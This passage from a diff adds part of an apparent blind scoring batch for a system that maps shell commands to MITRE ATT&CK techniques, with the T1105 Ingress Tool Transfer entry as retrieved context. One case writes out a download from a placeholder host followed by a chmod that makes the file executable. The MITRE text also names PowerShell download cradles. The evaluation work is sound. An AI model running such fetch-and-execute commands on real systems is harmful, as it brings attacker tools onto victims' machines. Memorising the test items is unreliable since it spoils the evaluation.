+      "retrieved_candidates": [
+        {
+          "content": "# Ingress Tool Transfer (T1105)\n\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** command-and-control\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1105",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1105",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Ingress Tool Transfer (T1105)"
+        }
+      ]
+    },
+    {
+      "case_id": "multi-command-002",
+      "claimed_behavior": "observed_command_behavior",
+      "command": "chmod +x /tmp/x",
+      "preceding_commands": [
+        "curl http://example.invalid/x -o /tmp/x"
+      ],
+      "retrieved_candidates": [
+        {
+          "content": "# Ingress Tool Transfer (T1105)\n\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)\n\n**Platforms:** ESXi, Linux, macOS, Network Devices, Windows\n\n**Tactics:** command-and-control\n\n**Recommended mitigations:** See ATT&CK website for details.",
+          "doc_id": "DONV2-T1105",
+          "provenance_status": "VALID",
+          "source": "https://attack.mitre.org/techniques/T1105",
+          "source_version": "local-mitre-corpus-2026-10-14",
+          "title": "MITRE Technique: Ingress Tool Transfer (T1105)"
+        }
+      ]
+    }
+  ],
+  "schema": "ragin.laya_scorer_blind_batch.v1"
+}
